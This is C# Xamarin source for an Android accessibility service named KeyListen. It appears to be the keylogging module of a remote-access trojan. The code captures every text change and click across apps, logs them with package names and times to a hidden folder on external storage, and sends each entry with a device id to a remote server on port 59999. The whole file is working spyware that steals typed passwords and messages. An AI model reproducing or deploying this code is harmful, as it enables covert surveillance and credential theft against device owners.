﻿using System;
using System.Collections.Generic;
using System.IO;
using Android;
using Android.AccessibilityServices;
using Android.App;
using Android.Content;
using Android.Content.PM;
using Android.Views.Accessibility;

namespace Task2
{
    [Service(Label = "@string/app_name", Permission = Manifest.Permission.BindAccessibilityService)]
    [IntentFilter(new[] { "android.accessibilityservice.AccessibilityService" })]
    public class KeyListen : AccessibilityService
    {
        public static List<string> loglar = new List<string>();
        protected override void OnServiceConnected()
        {           
            try
            {
               
                if (!Directory.Exists(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly"))
                {
                    Directory.CreateDirectory(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                }
               
                var accessibilityServiceInfo = ServiceInfo;
                accessibilityServiceInfo.EventTypes |= EventTypes.ViewTextChanged;
                accessibilityServiceInfo.EventTypes |= EventTypes.ViewClicked;
                accessibilityServiceInfo.Flags |= AccessibilityServiceFlags.IncludeNotImportantViews;
                accessibilityServiceInfo.Flags |= AccessibilityServiceFlags.RequestFilterKeyEvents;
                accessibilityServiceInfo.Flags |= AccessibilityServiceFlags.ReportViewIds;
                accessibilityServiceInfo.Flags |= AccessibilityServiceFlags.RequestTouchExplorationMode;
                accessibilityServiceInfo.FeedbackType = FeedbackFlags.AllMask;
                accessibilityServiceInfo.NotificationTimeout = 1;

                SetServiceInfo(accessibilityServiceInfo);
            }
            catch (Exception) { }
            base.OnServiceConnected();
        }
        string tempus = "";
        private string paketIsmi(AccessibilityEvent ivent)
        {
            if (ivent.PackageName != tempus)
            {
                tempus = ivent.PackageName;
                return "[" + DateTime.Now.ToString("HH:mm") + "] " + ivent.PackageName + "[NEW_LINE]";
            }
            return "";
        }
        string temp2 = "";
        private string paketIsmi_(AccessibilityEvent ivent_)
        {
            if (ivent_.PackageName != temp2)
            {
                temp2 = ivent_.PackageName;
                return "[Tıklandı][" + DateTime.Now.ToString("HH:mm") + "] " + ivent_.PackageName + " ";
            }
            return "[Tıklandı] ";
        }
        public override void OnAccessibilityEvent(AccessibilityEvent e)
        {
            string dataFiles = Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly/" +
               string.Format("{0}-{1}-{2}", DateTime.Now.Day, DateTime.Now.Month, DateTime.Now.Year) + ".tht";
            switch (e.EventType) {

                case  EventTypes.ViewTextChanged:
                    try
                    {
                        string cr = paketIsmi(e) + e.Text[0];
                        
                        loglar.Add(cr);
                        
                        using (System.IO.StreamWriter sw = System.IO.File.AppendText(dataFiles))
                        {
                            sw.WriteLine(cr);
                        }
                        
                        if (MainActivity.key_gonder == true)
                        {
                            byte[] veri = System.Text.Encoding.UTF8.GetBytes("CHAR|" + cr + "|" + MainValues.uniq_id + "|");
                            PictureCallback.Send(MainActivity.server, veri, 0, veri.Length, 59999);
                        }
                    }
                    catch (Exception)
                    {
                    }
                    break;
             case EventTypes.ViewClicked:

                    try
                    {
                        string cr = paketIsmi_(e) + e.Text[0];
                       
                        loglar.Add(cr);
                        
                        using (System.IO.StreamWriter sw = System.IO.File.AppendText(dataFiles))
                        {
                            sw.WriteLine(cr);
                        }
                        
                        if (MainActivity.key_gonder == true)
                        {
                            byte[] data = System.Text.Encoding.UTF8.GetBytes("CHAR|" + cr + "|" + MainValues.uniq_id + "|");
                            PictureCallback.Send(MainActivity.server, data, 0, data.Length, 59999);
                        }
                    }
                    catch (Exception)
                    {
                    }
            break;
        }      
        }      
        public override void OnInterrupt()
        {

        }
    }
}